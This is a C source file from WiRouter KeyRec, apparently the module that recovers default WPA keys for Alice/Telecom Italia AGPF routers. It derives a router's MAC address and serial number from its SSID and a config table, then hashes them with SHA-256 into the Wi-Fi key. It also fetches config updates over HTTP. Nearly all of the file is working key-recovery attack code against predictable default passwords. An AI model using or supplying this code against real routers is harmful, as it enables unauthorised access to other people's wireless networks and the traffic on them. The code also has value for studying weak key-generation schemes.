/*

    WiRouter KeyRec - Salvatore Fresta

    Contact: salvatorefresta@gmail.com

    Copyright 2010-2011 Salvatore Fresta aka Drosophila

    This program is free software; you can redistribute it and/or
    modify it under the terms of  the  GNU General Public License
    as published by the  Free Software Foundation; either version
    2 of the License, or (at your option) any later version.

    This program  is  distributed  in the hope  that  it  will be
    useful, but WITHOUT ANY WARRANTY;  without  even the  implied
    warranty  of  MERCHANTABILITY  or  FITNESS  FOR  A PARTICULAR
    PURPOSE. See the GNU General Public License for more details.

    You should have  received a copy  of  the  GNU General Public
    License along  with  this program;  if not, write to the Free
    Software Foundation,Inc., 59 Temple Place, Suite 330, Boston,
    MA 02111-1307 USA

    http://www.gnu.org/licenses/gpl-2.0.txt

*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include "agpf.h"
#include "socket.h"
#include "sha256.h"
#include "wirouterkeyrec.h"

extern int errno;

/*
    Update the AGPF configuration file
*/

int agpf_update_config_file(unsigned char *filename, unsigned char *host, int port, unsigned char *url, char *delone, char *deltwo, int debug) {
  
    FILE *fp = NULL;
    
    int sd,
        pkglen;
    unsigned char *pkg     = NULL,
                  *rec     = NULL,
                  *payload = NULL;

		  
    printf("Connecting to %s...", host);

    if((sd = socket_connect(host, port)) < 0) {
      if(debug) PRINT_DEBUG("Connection failed.\n\n");
      return -1;
    }

    printf("\nConnection estabilished.");
  
    pkglen = vspr((char **)&pkg, "GET %s HTTP/1.1\r\n"
                                 "Host: %s\r\n\r\n", url, host);
  
    if(send(sd, (char *)pkg, pkglen, 0) < 0) {
      if(debug) PRINT_DEBUG("Sending failed.\n\n");
      close(sd);
      free(pkg);
      return -1;
    }
  
    free(pkg);

    if(!(rec = socket_receive(sd, 4))) {
      if(debug) PRINT_DEBUG("Receive failed.\n\n");
      close(sd);
      return -1;
    }
  
    if(delone && deltwo) {
      payload = (unsigned char *) grab((char *)rec, delone, deltwo, 0, 0);
      if(!payload) {
	if(debug) PRINT_DEBUG("Unable to grab the payload.\n\n");
        return -1;
      }
    }
    else {
      payload = (unsigned char *) strstr((char *)rec, "\r\n\r\n");
      if(!payload) {
	if(debug) PRINT_DEBUG("Unable to get the payload.\n\n");
        return -1;
      }
    }

    close(sd);

    printf("\nConnection closed.");

    fp = fopen((char *)filename, "w+");
    if(!fp) {
      printf("\nUnable to open the configuration file [Errno: %s].\n\n", strerror(errno));
      return -1;
    }
  
    fprintf(fp, "%s", (char *)payload);
    fclose(fp);
  
    free(rec);
    
    printf("\nUpdate complete. Check the content of %s\n\n", filename);
  
    return 0;
  
}



/*
    Calculates a WPA key and returns it on wpakey buffer
*/

void agpf_calculate_wpa_key(unsigned char *alis, int alissize, unsigned char serial[14], unsigned char mac[6], unsigned char wpakey[25]) {

    int i;
    unsigned char hash[32];
    SHA2_CTX ctx;

    /* Calculating of the SHA-256 hash */
    sha2_init(&ctx);
    sha2_update(&ctx, alis, alissize);
    sha2_update(&ctx, serial, 13);
    sha2_update(&ctx, mac, 6);
    sha2_finish(&ctx, hash);

    for(i=0; i<24; i++) wpakey[i] = telecom_conversion_table[(int) hash[i]];
    wpakey[i] = 0x00;

}



/*
    Deletes the specified AGPF_config list
*/

AGPF_config *agpf_config_free(AGPF_config *first) {

  AGPF_config *tmp = NULL;

  while(first) {
      tmp = first;
      first = first->next;
      free(tmp);
    }

    return first;

}



/*
    Creates a new record of AGPF_config type and attach
    it at the end of the specified AGPF_config list
*/

AGPF_config *agpf_config_add(AGPF_config *first, unsigned char mac_eth[6], unsigned char wpa_key[25], unsigned char sn[14], int k, int q, int sn1) {

    AGPF_config *new = NULL,
                   *tmp = NULL;

    if(first) for(tmp=first; tmp->next; tmp=tmp->next);

    new = (AGPF_config *) malloc(sizeof(AGPF_config));
    if(!new) return first;

    strncpy((char *)new->serial, (char *)sn, 14);
    strncpy((char *)new->wpa_key, (char *)wpa_key, 25);
    memcpy(new->mac_eth, mac_eth, 6);
    new->k = k;
    new->q = q;
    new->sn1 = sn1;
    new->next = NULL;

    if(first)
      tmp->next = new;
    else
      first = new;

    return first;

}



/*
    Returns the AGPF_config list for the specified WiFi Network
*/

AGPF_config *agpf_get_config(unsigned char *extended_ssid, unsigned char *error, unsigned char *config_file, int debug) {

   AGPF_config *config_list = NULL;

    int q    = 0,
        k    = 0,
        sn1  = 0,
        agpf = -1,
        found = 0,
        step, i, j, t;

    unsigned char mac_eth[6],      // Octect MAC Address
          sn[15],      // Complete Serial Number
          wpa_key[25],  // WPA Key
          *filename  = NULL,
          *buffer    = NULL,
          *substring = NULL,
          *mac_read  = NULL,
          *ssid      = NULL;

    FILE *fp         = NULL;


    ssid = agpf_check_ssid(extended_ssid);
    if(!ssid) return NULL;

    /*
        Set the configuration file
    */
    if(strlen((char *)config_file) > 0)
      filename = config_file;
    else {

      if(!wr_check_file_exist((unsigned char *) AGPF_DEFAULT_CONFIG_FILE))
        filename = (unsigned char *) AGPF_DEFAULT_CONFIG_FILE;
      else
        filename = (unsigned char *) AGPF_DEFAULT_CONFIG_FILE_DIR;

    }

    if(debug) PRINT_DEBUG("[Alice-%s] Configuration file %s.", ssid, filename);

    fp = fopen((char *)filename, "rb");
    if(!fp) {
      PRINT_ERROR("Unable to open the configuration file [Errno: %s]", strerror(errno));
      return NULL;
    }

readfile:

    while((buffer = wr_myfgets(fp))) {

      for(step=0; step<=4; step++) {
	
	  if(buffer[0] == 0x23) break; // On comment read the next line

          if(!step)
              substring = (unsigned char *) strtok((char *)buffer, ",");
          else
              substring = (unsigned char *) strtok(NULL, ",");

          if(!substring) break;

          if(substring[0] == '"') substring += 1;

          switch(step) {

              /*
                  Checking the Access Point's version
              */
              case 0:
                  for(j=0; substring[j] && ssid[j]; j++)
                      if(substring[j] != 'X' &&
                        substring[j] != 'x' &&
                        substring[j] != ssid[j]) goto readfile;
              break;

              /*
                  Extraction of the Serial Number's second part
              */
              case 1:
                  sn1 = atoi((char *)substring);
              break;

              /*
                  Extraction of the K constant
              */
              case 2:
                  k = atoi((char *)substring);
              break;

              /*
                  Extraction of the Q constant
              */
              case 3:
                  q = atoi((char *)substring);
              break;

              /*
                  Extaction of the first three bytes of the
                  MAC Address Ethernet
              */
              case 4:

                mac_read = substring;
                if(strlen((char *)mac_read) < 6) goto readfile;

                for(j=0; j<3; j++) {

                  if(strncasecmp((char *)mac_read, "XX", 2) == 0)
                    mac_eth[j] = 0xFF;
                  else {
                    sscanf((char *)mac_read, "%02x", &t);
                    mac_read += 2;
                    mac_eth[j] = t;
                  }

                }

              break;

              default: break;

          }


      }


      if(debug) PRINT_DEBUG("[Alice-%s] Configuration found!", ssid);


      /*
          Process the read information
      */

      for(agpf=0, i=0; i<=2; i++) {

        /*
            Generates a complete MAC Address Ethernet
        */
        agpf_get_mac_address_ethernet(ssid, mac_eth, i);

        /*
            Checks for a valid AGPF router
        */
        if(agpf_check_agpf(mac_eth, ssid) < 0) continue;

        agpf = 1;

        /*
            Calculates the complete Serial Number
        */
        agpf_get_serial(q, k, sn1, ssid, sn, sizeof(sn)-1);

        /*
            Calculates the WPA key
        */
        agpf_calculate_wpa_key((unsigned char *)telecom_alis, sizeof(telecom_alis), sn, mac_eth, wpa_key);
        if(debug) PRINT_DEBUG("[Alice-%s] WPA Key calculated successful.", ssid);

        /*
            Creates and attach a new AGPF_config record to the list
        */
        config_list = agpf_config_add(config_list, mac_eth, wpa_key, sn, k, q, sn1);
        if(!config_list)
          PRINT_FATAL_ERROR("Unable to allocate the memory for the configuration of %s [Errno: %s].", ssid, strerror(errno));

        found=1;

      }

      /*
          WPA Key Not Found
      */
      if(!found) {
          if(!agpf)
              strncpy((char *)error, "This is not an AGPF Router.", ERROR_LENGTH-1);
          else {
            config_list = agpf_config_add(config_list, mac_eth, (unsigned char *)"key not found!", (unsigned char *)"", k, q, sn1);
            if(!config_list)
                PRINT_FATAL_ERROR("Unable to allocate the memory for the configuration of %s [Errno: %s].", ssid, strerror(errno));
          }
      }


    }

    if(!found && agpf < 0) strncpy((char *)error, "Router not present in the config file.", ERROR_LENGTH-1);

    fclose(fp);

    return config_list;

}



/*
    Calculates the last three bytes of the MAC Address Ethernet
*/

void agpf_get_mac_address_ethernet(unsigned char *ssid, unsigned char mac_eth[6], int test) {

    int i,
        t,
        ssid_num;

    unsigned char ssid_new[10],
          ssid_hex[9],
          *p=NULL;

    if(!test)
      snprintf((char *)ssid_new, sizeof(ssid_new), "%s", ssid);
    else
      snprintf((char *)ssid_new, sizeof(ssid_new), "%d%s", test, ssid);

    ssid_num = atoi((char *)ssid_new);
    sprintf((char *)ssid_hex, "%02x", ssid_num);

    for(p=ssid_hex+1, i=3; i<6; i++, p+=2) {

      sscanf((char *)p, "%02x", &t);
      mac_eth[i] = t;

    }


}



/*
    Calculates complete serial number and returns it on serial buffer of snsize size
*/

void agpf_get_serial(int q, int k, int sn1, unsigned char *ssid, unsigned char serial[14], int snsize) {

    int netid, sn2;

    netid = atoi((char *)ssid);

    /* Calculating of the second part of the serial number */
    sn2 = (netid-q)/k;

    /* Generating of the complete serial number */
    snprintf((char *)serial, snsize, "%dX%07d", sn1, sn2);
    serial[snsize-1] = 0x00;

}



/*
    Checks if the Network specified by ssid with mac MAC Address Ethernet
    is a valid AGPF router
*/

int agpf_check_agpf(unsigned char *mac, unsigned char *ssid) {

    int sum, i, ssid_id;

    ssid_id = atoi((char *)ssid);

    for(i=2, sum=0; i<6; i++) sum |= mac[i] << (24 - ((i-2) * 8));

    sum &= 0x0fffffff;
    sum %= 100000000;

    return (sum != ssid_id) ? -1 : 0;

}



/*
    Checks for a valid Alice SSID
*/

unsigned char *agpf_check_ssid(unsigned char *in) {

    int i;
    unsigned char *ssid = NULL;

    if(!in && strncasecmp((char *)in, "alice-", 6)) return NULL;

    ssid = (unsigned char *) strrchr((char *)in, '-');

    if(strlen((char *)in) != 14 || !ssid || strlen((char *)ssid) != 9) return NULL;

    ssid  += 1;

    for(i=0; ssid[i]; i++) if(!(ssid[i] >= 0x30 && ssid[i] <= 0x39)) return NULL;

    return ssid;

}


